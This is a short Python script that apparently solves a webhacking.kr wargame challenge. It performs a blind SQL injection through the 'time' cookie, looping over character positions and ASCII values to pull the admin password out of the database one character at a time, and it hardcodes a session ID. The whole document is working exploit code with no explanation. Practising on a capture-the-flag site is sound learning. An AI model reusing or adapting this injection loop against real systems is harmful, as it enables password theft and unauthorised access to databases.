import urllib.request

password = ""

for i in range(1, 9):
    for j in range(30,172):
        url = "http://webhacking.kr/challenge/web/web-02/"
        re = urllib.request.Request(url)

        re.add_header('Cookie', 'time=1515414399 and (select ascii(substring(password,{},1)) from admin)={}; PHPSHESSID=b42c70b37b426e713f255de859633556'.format(i,j))
        
        res = urllib.request.urlopen(re).read()
        if str(res).find("09:00:01") != -1:
            password += chr(j)
            print("Found it!! => " + password)
            break
print("Finished Searching.")
print("Password : " + password)